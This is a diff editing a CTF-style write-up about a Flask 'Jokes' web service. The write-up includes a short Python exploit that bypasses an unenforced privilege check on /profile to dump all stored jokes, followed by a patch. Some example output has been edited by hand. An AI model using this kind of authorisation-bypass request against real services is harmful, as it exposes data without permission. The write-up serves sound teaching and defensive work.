@@ -11,7 +11,7 @@ Jokes is a Webservice written in Python (Flask). It also uses an sqlite database
 
 The service consists of several different routes. The routes `/login`, `/register` and `/logout` are handling everything related to authentication. In this specific case, these routes are not very interesting for the further exploitation.
 
-To create an alter the content of jokes, the services also consists of the routes `/review`, `/like-joke` and `/profile`. The first two are also not interesting. The code of `/profile` contains the following function:
+To create and alter the content of jokes, the services also consists of the routes `/review`, `/like-joke` and `/profile`. The first two are also not interesting. The code of `/profile` contains the following function:
 ```py
 @app.route('/profile', methods=["POST"])
 @login_required
@@ -85,7 +85,7 @@ print(f"""String: {eventhandler["backup"]}""")
 ```
 Output:
 ```py
-Eventhandler: {'submit': <function backup at 0x00000179C6FEA020>, 'review': <function backup at 0x00000179C6FEA020>, 'export': <function backup at 0x00000179C6FEA020>, 'backup': <function backup at 0x00000179C6FEA020>}
+Eventhandler: {'submit': <function submit at 0x00020179C6FEA020>, 'review': <function review at 0x00000179C6FEA120>, 'export': <function export at 0x00000179C6FEA220>, 'backup': <function backup at 0x00000179C6FEA020>}
 AdminEvent: <function backup at 0x00000179C6FEA020>
 PublicEvent: <function backup at 0x00000179C6FEA020>
 String: <function backup at 0x00000179C6FEA020>
@@ -134,12 +134,12 @@ session.post(f"http://[{HOST}]:5000/register", headers=headers, data=data) # Cre
 session.post(f"http://[{HOST}]:5000/login", headers=headers, data=data) # Login as the new user
 
 
-expoort_body = {
+backup_body = {
     "privileges": "public",
-    "event": "export"
+    "event": "backup"
 } # This is the main part of the exploit. The service never enforces the privilege policy. Because of that, we can set the priviliges to public and circumvent any restriction measurements. By default the privileges of this request are set do "admin"
 
-req = session.post(f"http://[{HOST}]:5000/profile", headers=headers, data=expoort_body) # Get backup using the "export" event to dump all existing jokes
+req = session.post(f"http://[{HOST}]:5000/profile", headers=headers, data=backup_body) # Get backup using the "backup" event to dump all existing jokes
 
 print(req.text)
 ```
@@ -151,7 +151,7 @@ Example output:
 By altering the value of the privileges key from `admin` to `public` in the last request to `/profile`, we can export every joke that has been created even though we are not administrator.
 
 ## Patching
-To patch the exploit, the only thing we have to do is to block access to the export function if we are not an administrator. The following code shows a patched verion of the service:
+To patch the exploit, the only thing we have to do is to block access to the backup function if we are not an administrator. The following code shows a patched version of the service:
 ```py
 @app.route('/profile', methods=["POST"])
 @login_required
@@ -170,7 +170,7 @@ def profile_post():
             else:
                 return eventhandler[AdminEvent(event)]()
         elif request.form.get("privileges") == "public":
-            if request.form.get("event") == "export" and flask_login.current_user != "admin": # Check for admin privileges
+            if request.form.get("event") == "backup" and flask_login.current_user != "admin": # Check for admin privileges
               return render_template("unauthorized.html", joke=Joke.query.filter_by(draft=False, under_review=False).order_by(func.random()).first()), 401  # Throw error if not permitted
 
             return eventhandler[PublicEvent(event)]()
